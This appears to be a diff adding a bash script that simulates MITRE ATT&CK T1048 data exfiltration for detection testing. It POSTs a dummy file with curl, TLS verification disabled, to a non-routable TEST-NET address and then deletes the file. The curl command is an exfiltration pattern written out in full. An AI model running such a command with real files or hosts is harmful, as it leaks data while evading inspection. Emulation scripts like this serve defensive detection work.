@@ -1,0 +1,11 @@
+#!/bin/bash
+
+echo -e `date +"%Y-%m-%d %H:%M:%S"` "\e[92m[T1048] Data exfiltration over HTTPS POST with TLS verification disabled: a living-off-the-land tool (curl) uploads a local file to a remote endpoint while skipping certificate validation to dodge inspection.\033[m"
+# SIMULATION ONLY: POSTs a harmless placeholder file (NOT real data) to a non-routable
+# TEST-NET address (RFC 5737), so nothing actually leaves the host. The -k (skip TLS
+# verify) + POST-file pattern is the detection signal.
+echo "SIMULATION-ONLY-not-real-data" > /tmp/exfil_dummy.txt
+curl -k -s -m3 --data-binary @/tmp/exfil_dummy.txt https://198.51.100.1/ >/dev/null 2>&1
+echo "  (POSTed a dummy file with TLS verification disabled to a non-routable IP)"
+# Cleanup
+rm -f /tmp/exfil_dummy.txt
